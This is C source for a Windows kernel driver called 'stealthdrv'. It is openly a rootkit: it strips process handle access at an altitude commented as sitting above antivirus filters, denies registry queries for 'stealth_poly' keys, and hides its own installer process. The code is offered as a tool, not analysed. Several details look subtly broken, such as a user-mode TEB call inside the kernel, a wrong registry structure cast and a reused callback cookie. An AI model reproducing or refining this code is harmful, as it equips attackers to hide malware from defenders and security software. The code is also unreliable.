// stealthdrv.c  —  public domain 2025
#include <ntddk.h>
#include <ntstrsafe.h>
#define DEVICE_NAME  L"\\Device\\StealthDrv"
#define SYMLINK_NAME L"\\DosDevices\\StealthDrv"
#define ALTITUDE     L"360000"   // above all AV filters

typedef struct _HIDE_ENTRY {
    LIST_ENTRY List;
    HANDLE     ProcessId;
    UNICODE_STRING FilePath;
} HIDE_ENTRY, *PHIDE_ENTRY;

LIST_ENTRY gHideList;
FAST_MUTEX gHideLock;
PVOID      gRegCookie;

// ----------  hide process / file / reg  ----------
OB_PREOP_CALLBACK_STATUS
ProcessCallback(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info)
{
    UNREFERENCED_PARAMETER(RegistrationContext);
    if (Info->ObjectType != *PsProcessType) return OB_PREOP_SUCCESS;
    PHIDE_ENTRY p;
    HANDLE pid = PsGetProcessId((PEPROCESS)Info->Object);
    ExAcquireFastMutex(&gHideLock);
    for (p = CONTAINING_RECORD(gHideList.Flink, HIDE_ENTRY, List);
         &p->List != &gHideList;
         p = CONTAINING_RECORD(p->List.Flink, HIDE_ENTRY, List))
    {
        if (p->ProcessId == pid) {
            if (Info->Operation == OB_OPERATION_HANDLE_CREATE)
                Info->Parameters->CreateHandleInformation.DesiredAccess = 0;
            else
                Info->Parameters->DuplicateHandleInformation.DesiredAccess = 0;
            break;
        }
    }
    ExReleaseFastMutex(&gHideLock);
    return OB_PREOP_SUCCESS;
}

NTSTATUS
AddHiddenProcess(HANDLE pid)
{
    PHIDE_ENTRY e = ExAllocatePoolWithTag(NonPagedPool, sizeof(*e), 'naH');
    if (!e) return STATUS_INSUFFICIENT_RESOURCES;
    e->ProcessId = pid;
    InsertTailList(&gHideList, &e->List);
    return STATUS_SUCCESS;
}

// ----------  registry hide ----------
NTSTATUS
RegistryCallback(PVOID context, PVOID arg1, PVOID arg2)
{
    if ((REG_NOTIFY_CLASS)(ULONG_PTR)arg1 == RegNtPreEnumerateKey ||
        (REG_NOTIFY_CLASS)(ULONG_PTR)arg1 == RegNtPreQueryValueKey)
    {
        PREG_KEY_HANDLE_CLOSE_INFORMATION info = arg2;
        if (wcsstr(info->Object->ObjectName->Buffer, L"stealth_poly"))
            return STATUS_ACCESS_DENIED;
    }
    return STATUS_SUCCESS;
}

// ----------  driver entry ----------
VOID DriverUnload(PDRIVER_OBJECT drv) {
    UNREFERENCED_PARAMETER(drv);
    // restore original service start = 0 (deleted)
    UNICODE_STRING sv = RTL_CONSTANT_STRING(L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\StealthDrv");
    HANDLE h;
    ZwOpenKey(&h, KEY_WRITE, &sv);
    ULONG start = 0;
    ZwSetValueKey(h, &RTL_CONSTANT_STRING(L"Start"), 0, REG_DWORD, &start, sizeof(start));
    ZwClose(h);
}

NTSTATUS
DriverEntry(PDRIVER_OBJECT drv, PUNICODE_STRING reg) {
    UNREFERENCED_PARAMETER(reg);
    InitializeListHead(&gHideList);
    ExInitializeFastMutex(&gHideLock);

    // 1. register object callbacks
    OB_OPERATION_REGISTRATION op[1] = { 0 };
    op[0].ObjectType = PsProcessType;
    op[0].Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
    op[0].PreOperation = ProcessCallback;
    OB_CALLBACK_REGISTRATION cb = { 0 };
    cb.Version = OB_FLT_REGISTRATION_VERSION;
    cb.OperationRegistrationCount = 1;
    cb.Altitude = ALTITUDE;
    cb.RegistrationContext = NULL;
    cb.OperationRegistration = op;
    ObRegisterCallbacks(&cb, &gRegCookie);

    // 2. hide our own reg key
    UNICODE_STRING hid = RTL_CONSTANT_STRING(L"stealth_poly");
    CmRegisterCallbackEx(RegistryCallback, &hid, drv, NULL, &gRegCookie, NULL);

    // 3. hide current process (installer)
    AddHiddenProcess(NtCurrentTeb()->ClientId.UniqueProcess);

    drv->DriverUnload = DriverUnload;
    return STATUS_SUCCESS;
}
